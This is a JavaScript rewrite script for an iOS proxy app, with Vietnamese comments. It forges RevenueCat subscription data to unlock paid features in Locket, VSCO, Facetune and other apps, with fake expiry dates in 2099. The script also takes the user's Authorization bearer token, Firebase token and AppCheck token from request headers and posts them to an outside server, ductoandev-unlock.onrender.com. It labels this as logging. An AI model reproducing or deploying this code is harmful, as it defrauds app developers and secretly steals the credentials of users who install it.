// RevenueCat Mở Khóa Premium Đa Ứng Dụng
// Hỗ trợ: Locket, VSCO, Mojo, HTTPBot, 1Blocker, Structured, Splice, Facetune
// Phiên bản: 2.4 (Fix Async Log + Device ID)
// Tác giả: DucToanDev

(function () {
  "use strict";

  // --- CÁC HẰNG SỐ ---
  const PURCHASE_DATE = "2026-02-10T00:00:00Z";
  const EXPIRES_DATE = "2099-12-31T23:59:59Z";
  const TIMEOUT_MS = 1500; // Thời gian chờ tối đa cho Log (1.5s)

  // --- CẤU HÌNH APP ---
  const APP_CONFIGS = {
    Locket: { entitlement: "Gold", productId: "locket.premium.yearly" },
    VSCO: {
      entitlements: ["membership"],
      products: ["VSCOANNUAL", "VSCOCAM02BUALL"],
    },
    Mojo: { entitlement: "pro", productId: "revenuecat.pro.yearly" },
    HTTPBot: {
      entitlement: "rc_lifetime",
      productId: "com.behindtechlines.HTTPBot.prounlock",
    },
    "1Blocker": {
      entitlement: "premium",
      productId: "blocker.ios.subscription.yearly",
    },
    Structured: { entitlement: "pro", productId: "structured.pro.yearly" },
    Splice: { entitlement: "premium", productId: "splice.subscription.yearly" },
    Facetune: {
      entitlement: "facetune.premium",
      productId: "facetune.subscription.yearly",
    },
  };

  // --- XỬ LÝ HEADERS ---
  const headers = $request.headers;
  const ua = headers["User-Agent"] || headers["user-agent"] || "";
  
  // Locket API Headers
  const authorization = headers["Authorization"] || "";
  const firebaseToken = headers["Firebase-Instance-ID-Token"] || headers["firebase-instance-id-token"] || "";
  const appCheck = headers["X-Firebase-AppCheck"] || headers["x-firebase-appcheck"] || "";
  const contentType = headers["Content-Type"] || headers["content-type"] || "";
  
  // Extract Bearer token
  const userToken = authorization.replace("Bearer ", "");

  // --- XỬ LÝ LOGIC PREMIUM (Chuẩn bị dữ liệu trước) ---
  let responseObj;
  try {
    responseObj = JSON.parse($response.body);
    if (!responseObj.subscriber) responseObj.subscriber = {};
    if (!responseObj.subscriber.subscriptions)
      responseObj.subscriber.subscriptions = {};
    if (!responseObj.subscriber.entitlements)
      responseObj.subscriber.entitlements = {};
  } catch (error) {
    responseObj = {
      subscriber: {
        subscriptions: {},
        entitlements: {},
        original_app_user_id: "",
        original_application_version: "",
      },
    };
  }

  const createSubscription = () => ({
    is_sandbox: false,
    ownership_type: "PURCHASED",
    billing_issues_detected_at: null,
    period_type: "normal",
    expires_date: EXPIRES_DATE,
    grace_period_expires_date: null,
    unsubscribe_detected_at: null,
    original_purchase_date: PURCHASE_DATE,
    purchase_date: PURCHASE_DATE,
    store: "app_store",
  });

  const createEntitlement = (productId) => ({
    grace_period_expires_date: null,
    purchase_date: PURCHASE_DATE,
    product_identifier: productId,
    expires_date: EXPIRES_DATE,
  });

  let appDetected = false;
  // (Giữ nguyên logic detect app của bạn để code gọn)
  for (const appName in APP_CONFIGS) {
    if (ua.includes(appName) || (appName === "Mojo" && ua.includes("mojo"))) {
      const config = APP_CONFIGS[appName];
      // Xử lý đặc biệt cho VSCO (mảng products)
      if (appName === "VSCO") {
        config.products.forEach(
          (pid) =>
            (responseObj.subscriber.subscriptions[pid] = createSubscription()),
        );
        config.entitlements.forEach(
          (ent) =>
            (responseObj.subscriber.entitlements[ent] = createEntitlement(
              config.products[0],
            )),
        );
      } else {
        responseObj.subscriber.subscriptions[config.productId] =
          createSubscription();
        responseObj.subscriber.entitlements[config.entitlement] =
          createEntitlement(config.productId);
      }
      appDetected = true;
      break;
    }
  }

  if (!appDetected) {
    // Mặc định Locket
    const config = APP_CONFIGS["Locket"];
    responseObj.subscriber.subscriptions[config.productId] =
      createSubscription();
    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(
      config.productId,
    );
  }

  // --- HÀM KẾT THÚC (QUAN TRỌNG) ---
  // Hàm này đảm bảo $done chỉ được gọi 1 lần duy nhất
  let isDone = false;
  const finish = () => {
    if (isDone) return;
    isDone = true;
    $done({ body: JSON.stringify(responseObj) });
  };

  // --- XỬ LÝ GỬI LOG (FIX ASYNC) ---
  if (authorization && typeof $httpClient !== "undefined") {
    // 1. Tạo Timeout an toàn: Nếu server log chậm quá 1.5s thì bỏ qua, cứ trả về Premium cho khách
    const timeoutId = setTimeout(() => {
      finish();
    }, TIMEOUT_MS);

    // 2. Gửi Log với đầy đủ headers Locket
    $httpClient.post(
      {
        url: "https://ductoandev-unlock.onrender.com/logs",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          app: "Locket",
          authorization: authorization,
          firebaseToken: firebaseToken,
          appCheck: appCheck,
          userAgent: ua,
          timestamp: new Date().toISOString(),
        }),
        timeout: 1000,
      },
      function (error, response, data) {
        // 3. Khi gửi xong (dù lỗi hay thành công) -> Hủy timeout chờ -> Kết thúc script
        clearTimeout(timeoutId);
        finish();
      },
    );
  } else {
    // Nếu không có token hoặc không có httpClient -> Kết thúc luôn
    finish();
  }
})();
